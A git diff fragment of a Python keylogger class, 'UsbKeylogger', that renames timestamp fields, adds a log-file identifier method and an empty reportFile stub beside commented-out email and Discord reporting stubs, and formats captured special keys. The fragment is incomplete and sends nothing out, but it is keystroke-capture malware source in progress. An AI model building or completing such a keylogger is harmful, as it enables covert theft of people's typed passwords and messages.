@@ -16,19 +16,31 @@ class UsbKeylogger:
     def __init__(self, reportInterval, reportType = "file"):
         self.reportInterval = reportInterval
         self.reportType = reportType
-        self.startTime = datetime.now() 
+        self.startTimeVal = datetime.now() 
         # Used to document the start datetime
-        self.endTime = datetime.now() 
+        self.endTimeVal = datetime.now() 
         # Used to document the end datetime
         self.keylog = "" 
         # Creates a global string variable named keylog to store the keylogs within. 
         # It will only store the keylogs of the set report interval.
 
+    def createFileIdentifier(self):
+        startTime = str(self.startTimeVal)
+        endTime = str(self.endTimeVal)
+        self.fileIndentifier = f"Log: {startTime} to {endTime}"
+
+    def reportFile(self):
+    #def reportEmail(self):
+    #def reportDiscord(self):
+
+
+
     def callback_Keyboard(self, event):
         eventName = event.eventName
         # Conditional statement to format the appearence of the keylogs in event that they key is not a typical character like a letter or number. 
         # Returns the length of the eventName variable and executes statement if it greater than 1.
-        if len(eventName) > 1:
+        nameLength = len(eventName)
+        if nameLength > 1:
             if eventName == "tab":
                 eventName = "[TAB]\t" # Replaces [TAB] with [TAB] and a tab space afterward    
             elif eventName == "enter":
